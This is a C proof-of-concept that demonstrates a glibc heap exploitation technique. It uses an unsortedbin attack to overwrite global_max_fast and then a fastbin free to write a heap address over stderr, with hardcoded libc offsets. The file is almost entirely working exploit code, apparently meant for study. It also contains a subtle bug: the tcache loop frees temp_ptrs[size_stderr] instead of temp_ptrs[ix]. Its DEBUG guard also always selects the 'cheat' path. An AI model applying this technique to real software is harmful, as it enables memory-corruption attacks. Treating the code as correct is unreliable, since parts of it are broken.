//Advantage1: Write a huge value to almost arbitrary 8byte-aligned higher addr

#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
#include<string.h>

typedef unsigned long long ull;

#define DEBUG 0
#define WAIT while(fgetc(stdin)!='\n');

ull *LSBs_gmf = 0x6940; //LSByte of global_max_fast. Third nibble has 4bit entropy
ull *off_gmf_libcbase = 0x3ed940; //offset between global_max_fast & libcbase
ull *off_stdout_libcbase = 0x3ec760; //offset between stdout & libcbase
ull *off_arena_libcbase = 0x3ebc40; //offset between main_arena & libcbase

unsigned size_formula(unsigned long delta){
  return (unsigned)(delta*2 + 0x20);
}

int main(int argc, char *argv[])
{
  WAIT

  // calc and get some addrs
  char num;
  ull *addr_stdout = stdout;
  ull *libcbase = (ull)addr_stdout - (ull)off_stdout_libcbase;
  ull *addr_gmf = (ull)off_gmf_libcbase + (ull)libcbase;
  ull *addr_main_arena = (ull)libcbase + (ull)off_arena_libcbase;
  ull *addr_fastbinY = (ull)addr_main_arena + 0x10;
  ull size_stderr = size_formula((ull)stderr - (ull)addr_fastbinY - 0x8);
  ull *attack;
  ull *target = 0;
  ull temp;
  ull *temp_ptrs[10];
  printf("Advantage 1\n");
  printf("_________________________\n\n");
  printf("* unsortedbin attack *\n");
  printf("[+]&global_max_fast: %p\n",addr_gmf);

  // alloc some chunks (0x30 for avoiding consolidation)
  unsigned long *a = malloc(0x450); //for unsortedbin attack
  malloc(0x30);
  unsigned long *a2 = malloc(0x450);
  malloc(0x30);
  unsigned long *a3 = malloc(0x450);
  malloc(0x30);

  // prepare for Advantage 1
  printf("[+]global_max_fast: 0x%llx\n",*addr_gmf);
  attack = malloc(size_stderr);
  free(a); //connect to unsortedbin

  //overwrite the 2nibble of unsortedbin's bk with global_max_fast's address
#ifndef DEBUG
  for(int ix=0;ix!=2;++ix){ //victim->bk
    temp = (unsigned long long)LSBs_gmf >> (8*ix);
    num = temp % 0x100;
    if(ix==0)
      num -= 0x10;
    *(char*)((unsigned long long)a+8+ix) = num;
  }
#else
  for(int ix=0;ix!=8;++ix){ //cheat for the simplicity
    temp = (ull)addr_gmf >> (8*ix);
    num = temp % 0x100;
    if(ix==0)
      num -= 0x10;
    *(char*)((ull)a+8+ix) = num;
  }
#endif

  //unsorted bin attack:
  printf("[*]unsortedbin attack...\n"); 
  malloc(0x450);
  printf("[+]global_max_fast: 0x%llx\n",*addr_gmf);
  
  //check whether the unsorted attack is success or not
  if(*addr_gmf != (ull)addr_main_arena+0x60){
    printf("\n\n[-]FAIL: unsortedbin attack\n");
    exit(0);
  }else{
    printf("\n[!]SUCCESS: unsortedbin attack\n");
  }


  /**Advantage 1: Overwrite almost arbitrary addr with chunk addr**/
  printf("\n* Advantage 1 *\n");
  printf("[+]Target address: %p (stderr)\n",stderr);
  printf("[+]stderr: %llx\n",*(ull*)stderr);
  if((ull)size_stderr <= 0x408){ // if the size is small enough for tcaching
    for(int ix=0;ix!=7;++ix){ //consume tcache
      temp_ptrs[ix] = malloc(size_stderr);
    }
    for(int ix=0;ix!=7;++ix){
      free(temp_ptrs[size_stderr]);
    }
  }
  printf("[*]attack...\n");
  free(attack);

  printf("[!]stderr: %llx\n",*(ull*)stderr);

  printf("\n\nCan you understand? Debug by yourself now.\n");
  //debugging time
  WAIT

  return 0;
}
